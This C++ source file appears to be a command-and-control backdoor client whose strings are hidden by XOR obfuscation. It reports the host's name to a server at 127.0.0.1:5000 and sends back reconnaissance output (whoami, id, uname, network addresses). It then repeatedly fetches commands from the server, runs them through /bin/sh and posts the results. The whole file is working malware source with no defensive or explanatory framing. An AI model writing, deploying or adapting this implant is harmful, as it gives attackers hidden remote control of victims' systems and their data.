#include <iostream>
#include <array>
#include <cstdio>
#include <memory>
#include <sstream>
#include <thread>
#include <atomic>
#include <chrono>
#include <vector>

std::string zz(const std::vector<int>& c) {
    std::string out;
    for(int i : c) out += (char)(i ^ 0x5A);
    return out;
}

static std::string a(const std::string& b) {
    std::array<char, 256> c{};
    std::string d;
    std::vector<int> e = {117, 56, 51, 52, 117, 41, 50, 122, 119, 57, 122, 120};
    std::vector<int> f = {120};
    std::string fullCmd = zz(e) + b + zz(f);
    FILE* pipe = popen(fullCmd.c_str(), zz({40}).c_str());
    if (!pipe) return zz({63, 40, 40, 53, 40, 96, 122, 60, 59, 51, 54, 63, 62, 122, 46, 53, 122, 53, 42, 63, 52, 122, 42, 51, 42, 63});
    while (fgets(c.data(), c.size(), pipe) != nullptr) d += c.data();
    pclose(pipe);
    if (!d.empty() && d.back() == '\n') d.pop_back();
    return d;
}

static std::string e(const std::string& b, const std::string& k) {
    if (b.empty()) return "";
    std::vector<int> q1 = {120};
    std::string needle = zz(q1) + k + zz(q1);
    size_t i = b.find(needle);
    if (i == std::string::npos) return "";
    size_t colon = b.find(':', i);
    if (colon == std::string::npos) return "";
    size_t s = b.find('"', colon);
    if (s == std::string::npos) return "";
    ++s;
    size_t e = b.find('"', s);
    if (e == std::string::npos || e <= s) return "";
    return b.substr(s, e - s);
}

static std::string f(const std::string& s) {
    std::string out;
    for (char c : s) {
        switch (c) {
            case '\\': out += "\\\\"; break;
            case '"': out += "\\\""; break;
            case '\n': out += "\\n"; break;
            case '\r': out += "\\r"; break;
            case '\t': out += "\\t"; break;
            default: out += c; break;
        }
    }
    return out;
}

static const std::vector<int> _u0 = {50, 46, 46, 42, 96, 117, 117, 107, 104, 109, 116, 106, 116, 106, 116, 107};
static const std::vector<int> _u1 = {96, 111, 106, 106, 106};

static std::string g(const std::string& path, const std::string& json) {
    std::vector<int> p1 = {57, 47, 40, 54, 122, 119, 41, 122, 119, 55, 122, 111, 122, 119, 2, 122, 10, 21, 9, 14, 122, 119, 18, 122, 125, 25, 53, 52, 46, 63, 52, 46, 119, 14, 35, 42, 63, 96, 122, 59, 42, 42, 54, 51, 57, 59, 46, 51, 53, 52, 117, 48, 41, 53, 52, 125, 122, 119, 62, 122, 120};
    std::vector<int> p2 = {120, 122, 125};
    std::vector<int> p3 = {125};
    std::string cmd = zz(p1) + f(json) + zz(p2) + zz(_u0) + zz(_u1) + path + zz(p3);
    std::string out = a(cmd);
    return out.empty() ? "" : out;
}

static std::string h(const std::string& path) {
    std::vector<int> p1 = {57, 47, 40, 54, 122, 119, 41, 122, 119, 55, 122, 111, 122, 125};
    std::vector<int> p3 = {125};
    std::string cmd = zz(p1) + zz(_u0) + zz(_u1) + path + zz(p3);
    std::string out = a(cmd);
    return out.empty() ? "" : out;
}

void _dc0() {
    int x = 42;
    if (((x * x) < 0)) {
        exit(0);
    }
}

std::atomic<bool> _st{true};

void _p() {
    int _st2 = 0;
    int fails = 0;

    while (_st && fails < 50) {
        switch(_st2) {
            case 0:
                std::this_thread::sleep_for(std::chrono::seconds((5 ^ 0) + (0 & 255)));
                _st2 = 1;
                break;
            case 1: {
                try {
                    std::string resp = h(zz({117, 57, 53, 55, 55, 59, 52, 62}));
                    if (resp.empty()) { fails++; _st2 = 0; continue; }
                    fails = 0;
                    std::string cmd = e(resp, zz({57, 53, 55, 55, 59, 52, 62}));
                    
                    if (cmd.empty() || cmd == zz({45, 59, 51, 46}) || cmd == zz({52, 53, 52, 63})) { _st2 = 0; continue; }
                    if (cmd == zz({63, 34, 51, 46}) || cmd == zz({43, 47, 51, 46})) {
                        _st = false;
                        break;
                    }
                    
                    std::string out = a(cmd);
                    g(zz({117, 40, 63, 41, 47, 54, 46}), zz({33, 33}) + zz({120, 53, 47, 46, 42, 47, 46, 120, 96, 120}) + f(out) + zz({120, 39, 39}));
                    _st2 = 0;
                } catch (...) { fails++; _st2 = 0; }
                break;
            }
        }
    }
}

int main() {
    _dc0();
    int op = 7;
    if (((op * op + op) % 2) == 0) {
        std::string host = a(zz({50, 53, 41, 46, 52, 59, 55, 63}));
        g(zz({117, 57, 50, 63, 57, 49, 51, 52}), std::string(zz({33, 33})) + std::string(zz({120, 50, 53, 41, 46, 120, 96, 120})) + f(host) + std::string(zz({120, 39, 39})));

        std::vector<int> c_1 = {63, 57, 50, 53, 122, 125, 103, 103, 103, 122, 18, 21, 9, 14, 20, 27, 23, 31, 122, 103, 103, 103, 125, 122, 124, 124, 122, 50, 53, 41, 46, 52, 59, 55, 63, 122, 124, 124, 122, 63, 57, 50, 53, 122, 125, 103, 103, 103, 122, 13, 18, 21, 27, 23, 19, 122, 103, 103, 103, 125, 122, 124, 124, 122, 45, 50, 53, 59, 55, 51, 122, 124, 124, 122, 63, 57, 50, 53, 122, 125, 103, 103, 103, 122, 19, 30, 122, 103, 103, 103, 125, 122, 124, 124, 122, 51, 62, 122, 124, 124, 122, 63, 57, 50, 53, 122, 125, 103, 103, 103, 122, 21, 9, 122, 103, 103, 103, 125, 122, 124, 124, 122, 47, 52, 59, 55, 63, 122, 119, 59, 122, 124, 124, 122, 63, 57, 50, 53, 122, 125, 103, 103, 103, 122, 20, 31, 14, 13, 21, 8, 17, 122, 103, 103, 103, 125, 122, 124, 124, 122, 114, 51, 42, 122, 59, 62, 62, 40, 122, 104, 100, 117, 62, 63, 44, 117, 52, 47, 54, 54, 122, 38, 38, 122, 51, 60, 57, 53, 52, 60, 51, 61, 122, 104, 100, 117, 62, 63, 44, 117, 52, 47, 54, 54, 115};
        std::string recon = a(zz(c_1));
        
        g(zz({117, 40, 63, 41, 47, 54, 46}), std::string(zz({33, 33})) + std::string(zz({120, 53, 47, 46, 42, 47, 46, 120, 96, 120})) + f(recon) + std::string(zz({120, 39, 39})));

        std::thread t(_p);
        t.join();
    }
    return 0;
}
